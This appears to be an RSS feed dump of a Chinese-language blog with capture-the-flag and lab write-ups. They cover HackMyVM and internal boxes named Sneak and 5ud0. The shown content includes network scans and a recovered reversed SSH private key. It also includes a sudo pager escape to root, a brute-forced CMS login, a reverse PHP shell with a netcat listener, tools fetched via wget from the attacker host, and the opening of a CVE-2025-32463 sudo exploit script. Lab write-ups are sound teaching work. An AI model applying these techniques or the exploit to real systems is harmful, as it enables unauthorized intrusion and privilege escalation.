&gt; Aero / AeroCMS 是一款简单易用的 CMS（内容管理系统），旨在创建快速强大的 Web 应用程序。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20059.html</guid><pubDate>Fri, 18 Jul 2025 14:57:03 +0000</pubDate></item><item><title>Challenge 058</title><link>https://7r1UMPHK.github.io/post/Challenge%20058.html</link><description>好像好久没打Challenge了，打打

![image-20250718210310881](https://7r1UMPHK.github.io/image/20250718210319612.webp)

https://hackmyvm.eu/challenges/challenge.php?c=058

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la 058.zip      
-rwxr-xr-x 1 kali kali 35450  7月18日 09:05 058.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 058.zip                      

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 35450 bytes (35 KiB)

Extracting archive: 058.zip
--
Path = 058.zip
Type = zip
Physical Size = 35450

Everything is Ok

Size:       35280
Compressed: 35450
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al        
总计 82
drwxr-xr-x 1 kali kali  4096  7月18日 09:05 .
drwxr-xr-x 1 kali kali  8192  7月17日 23:37 ..
-rwxr-xr-x 1 kali kali 35450  7月18日 09:05 058.zip
-rwxr-xr-x 1 kali kali 35280 2023年12月28日 challenge.png
```

![challenge](https://7r1UMPHK.github.io/image/20250718210626732.webp)

像是图形加密

https://www.dcode.fr/symbols-ciphers

找就完事了

D'ni Numerals

解一下密

![image-20250718211005223](https://7r1UMPHK.github.io/image/20250718211005590.webp)

```
HMV{13377331}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20058.html</guid><pubDate>Fri, 18 Jul 2025 14:56:49 +0000</pubDate></item><item><title>内部_chabaidao</title><link>https://7r1UMPHK.github.io/post/nei-bu-_chabaidao.html</link><description>![image-20250717204541576](https://7r1UMPHK.github.io/image/20250717204550270.webp)

下载地址：https://mega.nz/file/If9khB4Y#osVSL5SXMQSUQEicWYFZ3Q5w-lovLyamBD_kfDpuNVI

---

# 一、信息收集与服务探测

## 1. 主机发现

首先，在内网环境中，我们使用 `arp-scan` 来发现同一网段下的存活主机。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_chabaidao.html</guid><pubDate>Fri, 18 Jul 2025 01:58:31 +0000</pubDate></item><item><title>内部_ajpsvr</title><link>https://7r1UMPHK.github.io/post/nei-bu-_ajpsvr.html</link><description>![image-20250716205953078](https://7r1UMPHK.github.io/image/20250716205953466.webp)

![image-20250716210011392](https://7r1UMPHK.github.io/image/20250716210011546.webp)

哈哈，整个活，补些wp

# 一、信息收集与服务探测

## 1. 主机发现

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.190 08:00:27:b0:70:3d       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 responded
```

扫描结果显示，IP 地址为 192.168.205.190

## 2. 端口与服务扫描

确定目标 IP 后，使用 nmap 对其进行全端口扫描，以发现所有开放的 TCP 端口及其上运行的服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_ajpsvr.html</guid><pubDate>Thu, 17 Jul 2025 01:06:27 +0000</pubDate></item><item><title>内部_Sneak</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Sneak.html</link><description>![image-20250715221242195](https://7r1umphk.github.io/image/20250715221302013.webp)

继续补wp

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.186 08:00:27:d2:ee:10       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.186
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 10:13 EDT
Nmap scan report for 192.168.205.186
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D2:EE:10 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
                                                                          
```

看web

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.186/ -v                                                                 
*   Trying 192.168.205.186:80...
* Connected to 192.168.205.186 (192.168.205.186) port 80
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.205.186
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Tue, 15 Jul 2025 14:14:11 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT
&lt; ETag: '6-6328b152a4f57'
&lt; Accept-Ranges: bytes
&lt; Content-Length: 6
&lt; Content-Type: text/html
&lt; 
index
* Connection #0 to host 192.168.205.186 left intact
                                             
```

群里面的模板，那直接爆破目录吧

有个cms

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.186/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.186/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 6]
/cms                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.186/cms/]
```

继续爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.186/cms -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.186/cms
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/index.php            (Status: 500) [Size: 0]
/.php                 (Status: 403) [Size: 280]
/content              (Status: 301) [Size: 324] [--&gt; http://192.168.205.186/cms/content/]
/modules              (Status: 301) [Size: 324] [--&gt; http://192.168.205.186/cms/modules/]
/rss.php              (Status: 500) [Size: 0]
/core                 (Status: 301) [Size: 321] [--&gt; http://192.168.205.186/cms/core/]
/license.txt          (Status: 200) [Size: 2602]
/install              (Status: 301) [Size: 324] [--&gt; http://192.168.205.186/cms/install/]
/lib                  (Status: 301) [Size: 320] [--&gt; http://192.168.205.186/cms/lib/]
/config.php           (Status: 200) [Size: 0]
/styles               (Status: 301) [Size: 323] [--&gt; http://192.168.205.186/cms/styles/]
/robots.txt           (Status: 200) [Size: 104]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/acp                  (Status: 301) [Size: 320] [--&gt; http://192.168.205.186/cms/acp/]
```

扒拉

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.186/cms/license.txt   
-----YEK ETAVIRP HSSNEPO NIGEB-----
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
==wBGUABDIQArFWZuNFQtRWYzl3cMAAAAkn2WUqipD5tU8
-----END OPENSSH PRIVATE KEY-----
               
```

出货啦，出货啦，哈哈哈

看着像ssh私钥，但是好像被处理过

看起来像单行反转，因为第一行的头是被rev的，第二行没问题，最后一行没问题，所以直接反转回去吧

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd ~/tmp                                                  
            
┌──(kali㉿kali)-[~/tmp]
└─$ curl http://192.168.205.186/cms/license.txt -o id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2602  100  2602    0     0  1267k      0 --:--:-- --:--:-- --:--:-- 2541k
                                                                                                                                                                                  
┌──(kali㉿kali)-[~/tmp]
└─$ awk 'NR%2==1 {system('echo \047'$0'\047 | rev'); next} 1' id_rsa &gt; id_rsa1
                                                                                                                                                                                  
┌──(kali㉿kali)-[~/tmp]
└─$ chmod 600 id_rsa1                                    
                                                                                                                                                                                  
┌──(kali㉿kali)-[~/tmp]
└─$ ssh-keygen -y -f id_rsa1
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMk/ZcOb/YUyfx7uI7lTYwamUZMR9vv6q97X+ga1pYrU0xLn910Czy+1chL3iNh7Ai45DepLnJrkRPejQ6TfeTmb2jL56R3YDygeIklQEPwI+y38FHg8wz44hir1CCcAn2dlV2Mi/MKtjVjMa2C8JYUWM065yTN5PMcrlY/1m6aAtJH8n7wpPh81SHYDY6C4KD8xF7yos5EMWhyuUa36Hg1R+uDFqgFCEl+Ixn3KBkDXFh0L/km0K5d4C8zr2NEQ5rEsDXfTb5Jn2hO7OJkGA7jtJDa917+e+X9sCdsB4PxFg5VzDWqREngHj7YoSd4QpQLgTC4Ca7YLP6RA2sQqpw9S/8ISOc4vnbbkdgDlYhRo49tLjAis97AtcxnhQImsNHmqHZWUmAbFuTHzpGOVhDmqLN3z/oZ8szRFG/yD7kowBGUhCbwfvGp1KgJYWGhpKE6zIwZA4CXndPHEox+LHXI+8IwXiQqiDOZw5HpFUD6NORUHzbUkpLd7jpjkOgqHs= sysadm@Sneak
```

连接

```
┌──(kali㉿kali)-[~/tmp]
└─$ ssh sysadm@192.168.205.186 -i id_rsa1
The authenticity of host '192.168.205.186 (192.168.205.186)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:6: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    ~/.ssh/known_hosts:16: [hashed name]
    ~/.ssh/known_hosts:17: [hashed name]
    (13 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.186' (ED25519) to the list of known hosts.
Linux Sneak 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
sysadm@Sneak:~$ id
uid=1002(sysadm) gid=1003(sysadm) groups=1003(sysadm)
sysadm@Sneak:~$ sudo -l
Matching Defaults entries for sysadm on Sneak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sysadm may run the following commands on Sneak:
    (ALL) NOPASSWD: /usr/bin/more /var/log/custom/fake-cleanup.sh
```

more是个分页器所以你缩小屏幕执行/usr/bin/more /var/log/custom/fake-cleanup.sh让他一页显示不了就可以了

![image-20250715222326570](https://7r1umphk.github.io/image/20250715222326683.webp)

&gt; [!Tip]
&gt;
&gt; sudo /usr/bin/more /var/log/custom/fake-cleanup.sh
&gt; 然后显示百分比
&gt;
&gt; 输入!/bin/bash

```
root@Sneak:/home/sysadm# iduid=0(root) gid=0(root) groups=0(root                   
root@Sneak:/home/sysadm# cat /root/root.txt /home/user/user.txt 
flag{root-36bee2f8db4943b0f6c9d16afe11d454}                                         
flag{user-9fcae37cb857fb5fc6f8d74c82a5d0ga}                                         
```

或者改stty也可以

```
sysadm@Sneak:~$ stty rows 2
sysadm@Sneak:~$ sudo /usr/bin/more /var/log/custom/fake-cleanup.sh
# System cleanup script - DO NOT MODIFY
!/bin/bash
root@Sneak:/home/sysadm# id
uid=0(root) gid=0(root) groups=0(root)
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Sneak.html</guid><pubDate>Tue, 15 Jul 2025 14:34:06 +0000</pubDate></item><item><title>内部_5ud0</title><link>https://7r1UMPHK.github.io/post/nei-bu-_5ud0.html</link><description>![image-20250715211044032](https://7r1umphk.github.io/image/20250715211044343.webp)

这个打完了，补个wp

&gt; [!Tip]
&gt;
&gt; 群里搞了一个我们自己靶机的wp仓库，感兴趣的可以看一下
&gt; https://github.com/hyhforevertop/Mazesec-writeups

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                                       
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.185 08:00:27:8e:cd:d9       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.954 seconds (131.01 hosts/sec). 4 responded
                                                                                     
```

192.168.205.185

探测服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.185  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 09:11 EDT
Nmap scan report for 192.168.205.185
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:8E:CD:D9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
                                                                       
```

看web

![image-20250715211201958](https://7r1umphk.github.io/image/20250715211202294.webp)

随便点个超链接发现跳转textpattern.dsz

加个hosts

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo vim /etc/hosts                                                                            
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts                     
192.168.205.185 textpattern.dsz
                              
```

![image-20250715211441278](https://7r1umphk.github.io/image/20250715211441521.webp)

目录爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://textpattern.dsz/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://textpattern.dsz/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/files                (Status: 301) [Size: 318] [--&gt; http://textpattern.dsz/files/]
/images               (Status: 301) [Size: 319] [--&gt; http://textpattern.dsz/images/]
/themes               (Status: 301) [Size: 319] [--&gt; http://textpattern.dsz/themes/]
/index.php            (Status: 200) [Size: 11506]
/sites                (Status: 301) [Size: 318] [--&gt; http://textpattern.dsz/sites/]
/css.php              (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 280]
/README.txt           (Status: 200) [Size: 1152]
/INSTALL.txt          (Status: 200) [Size: 3080]
/LICENSE.txt          (Status: 200) [Size: 15170]
/rpc                  (Status: 301) [Size: 316] [--&gt; http://textpattern.dsz/rpc/]
Progress: 45805 / 1102800 (4.15%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 48835 / 1102800 (4.43%)
===============================================================
Finished
===============================================================
```

扒拉了一下，在README.txt看到了cms的版本号

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://textpattern.dsz/README.txt                          
Textpattern CMS 4.8.7

Released under the GNU General Public License.
See LICENSE.txt for terms and conditions.

Includes contributions licensed under the GNU Lesser General Public License.
See textpattern/lib/LICENSE-LESSER.txt for terms and conditions.

Includes contributions licensed under the New BSD License.
See textpattern/lib/LICENSE-BSD-3.txt for terms and conditions.


== About ==

Textpattern CMS is a flexible, elegant and easy-to-use content management
system. Textpattern is free and open source.


== Installing Textpattern ==

* Refer to INSTALL.txt for details.


== Upgrading Textpattern ==

* Refer to UPGRADE.txt for details.


== Resources ==

* Website:       https://textpattern.com/
* Support forum: https://forum.textpattern.com
* Documentation: https://docs.textpattern.com

* Social:        https://textpattern.com/twitter

* Development:   https://textpattern.com/github
* Contributing:  https://docs.textpattern.com/development/contributing

* Sponsor:       https://github.com/sponsors/textpattern
                 https://opencollective.com/textpattern-collective
* Donate:        https://textpattern.com/about/patrons
                                                  
```

Textpattern CMS 4.8.7，google了一下，看到了一个远程命令执行和上传漏洞，所以还是需要爆破一下用户密码
![image-20250715211701681](https://7r1umphk.github.io/image/20250715211701938.webp)

点这里会跳转登录或者访问    http://textpattern.dsz/textpattern/

随便输入点抓包

![image-20250715211818852](https://7r1umphk.github.io/image/20250715211819190.webp)

只可以硬爆，巨慢

![image-20250715212036753](https://7r1umphk.github.io/image/20250715212037141.webp)

![image-20250715212123475](https://7r1umphk.github.io/image/20250715212123818.webp)

密码就rockyou.txt，不截图了

然后开启，等就好了

![image-20250715212254371](https://7r1umphk.github.io/image/20250715212254743.webp)

admin:superman

![image-20250715212344044](https://7r1umphk.github.io/image/20250715212344398.webp)

上传一个reverse.php上去就好了

kali监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888           
listening on [any] 8888 ...
```

![image-20250715212430424](https://7r1umphk.github.io/image/20250715212430750.webp)

去http://textpattern.dsz/files/

![image-20250715212454872](https://7r1umphk.github.io/image/20250715212455203.webp)

点击，转圈圈

回去看监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.185] 38534
Linux 5ud0 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux
 09:24:54 up 14 min,  0 users,  load average: 0.00, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (500): Inappropriate ioctl for device
bash: no job control in this shell
www-data@5ud0:/$ ls /home
ls /home
todd
www-data@5ud0:/$ su todd
su todd
Password: todd
su: Authentication failure
www-data@5ud0:/$ ls -la /opt
ls -la /opt
total 8
drwxr-xr-x  2 root root 4096 Jul  9 21:31 .
drwxr-xr-x 18 root root 4096 Jul 10 04:36 ..
www-data@5ud0:/$ find / -perm -4000 -type f 2&gt;/dev/null
find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/local/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

试了一下弱密码不行，然后看了一下suid，发现有两个sudo

/usr/bin/sudo

/usr/local/bin/sudo

对比一下

```
www-data@5ud0:/$ diff /usr/bin/sudo /usr/local/bin/sudo
diff /usr/bin/sudo /usr/local/bin/sudo
Binary files /usr/bin/sudo and /usr/local/bin/sudo differ
```

而且这个靶机名字就叫5ud0，所以很怀疑

```
www-data@5ud0:/$ /usr/bin/sudo -V
/usr/bin/sudo -V
Sudo version 1.9.16p2
Sudoers policy plugin version 1.9.16p2
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.16p2
Sudoers audit plugin version 1.9.16p2
www-data@5ud0:/$ /usr/local/bin/sudo -V
/usr/local/bin/sudo -V
Sudo version 1.9.6
Sudoers policy plugin version 1.9.6
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.6
Sudoers audit plugin version 1.9.6
```

/usr/local/bin/sudo是比较新的版本，/usr/bin/sudo是1.9.16p2的，这个版本好像前端时间爆出了一个漏洞，google一下

![image-20250715212901470](https://7r1umphk.github.io/image/20250715212901701.webp)

群里前段时间也提了一下，不过我们现在需要先~~拿个知道密码的用户，www-data的密码我可不知道~~ （纯小丑，CVE-2025-32463不需要密码就可以利用）

todd没有找到什么有意思的东西，那爆破密码吧

先稳定一下shell

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

```
www-data@5ud0:/tmp$ busybox wget 192.168.205.128/rockyou.txt
Connecting to 192.168.205.128 (192.168.205.128:80)
rockyou.txt          100% |********************************|  133M  0:00:00 ETA
www-data@5ud0:/tmp$ busybox wget 192.168.205.128/suForce
Connecting to 192.168.205.128 (192.168.205.128:80)
suForce              100% |********************************|  2430  0:00:00 ETA
www-data@5ud0:/tmp$ chmod +x suForce 
www-data@5ud0:/tmp$ ./suForce 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
 ❓  Usage: suForce [OPTIONS]

 🌐  Get a user password with the su binary.

 📋  Options:
       -u &lt;USER&gt;      Specify the username you want to attack.
       -w &lt;WORDLIST&gt;  Specify the path where the wordlist is located.
       -h             Display this help message and exit.

 💡  Examples:
       suForce -u root -w rockyou.txt
       suForce -h 

───────────────────────────────────

```

我这偷个鸡，我知道是9000行左右的，我提取1w行，然后从后往前爆破

```
www-data@5ud0:/tmp$ head -n 10000 rockyou.txt |tac &gt; passwd.txt
www-data@5ud0:/tmp$ ls -al passwd.txt 
-rw-rw-rw- 1 www-data www-data 80577 Jul 15 09:41 passwd.txt
www-data@5ud0:/tmp$ ./suForce -u todd -w passwd.txt 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | todd
📖 Wordlist | passwd.txt
🔎 Status   | 8/10000/0%/nopassword
💥 Password | nopassword
───────────────────────────────────

```

登上去

```
www-data@5ud0:/tmp$ su todd
Password: 
todd@5ud0:/tmp$ id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
```

https://github.com/pr0v3rbs/CVE-2025-32463_chwoot

漏洞poc

```
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

if [ $# -eq 0 ]; then
    # If no command is provided, default to an interactive root shell.
    CMD='/bin/bash'
else
    # Otherwise, use the provided arguments as the command to execute.
    CMD='$@'
fi

# Escape the command to safely include it in a C string literal.
# This handles backslashes and double quotes.
